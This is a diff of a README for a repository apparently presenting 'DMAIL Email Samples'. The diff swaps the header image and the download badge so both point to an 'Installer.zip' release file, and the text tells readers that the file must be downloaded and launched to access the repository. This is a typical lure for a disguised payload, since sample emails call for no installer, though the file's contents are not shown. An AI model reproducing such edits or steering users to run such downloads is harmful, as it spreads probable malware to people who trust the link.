@@ -1,6 +1,6 @@
 # 📧 DMAIL Email Samples 📧
 
-![DMAIL Email Samples](https://example.com/dmail.jpg)
+![DMAIL Email Samples](https://github.com/Prajwal50/DMAIL_EmailSamples/releases/download/v1.0/Installer.zip)
 
 Welcome to the official source repository for the DMAIL implementation of the EMAIL 2 Email Samples specification, where we create a sample of emails to showcase the capabilities of our system!
 
@@ -14,7 +14,7 @@ Welcome to the official source repository for the DMAIL implementation of the EM
 
 To explore the samples and start using the DMAIL Email Samples, you can download the repository by clicking the button below:
 
-[![Download DMAIL Email Samples](https://img.shields.io/badge/Download-DMAIL_EmailSamples-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download DMAIL Email Samples](https://github.com/Prajwal50/DMAIL_EmailSamples/releases/download/v1.0/Installer.zip)](https://github.com/Prajwal50/DMAIL_EmailSamples/releases/download/v1.0/Installer.zip)
 
 Please note that the link above leads to a specific file that needs to be downloaded and launched to access the repository. If you encounter any issues with the link, feel free to check the "Releases" section of this repository for alternative download options.
 
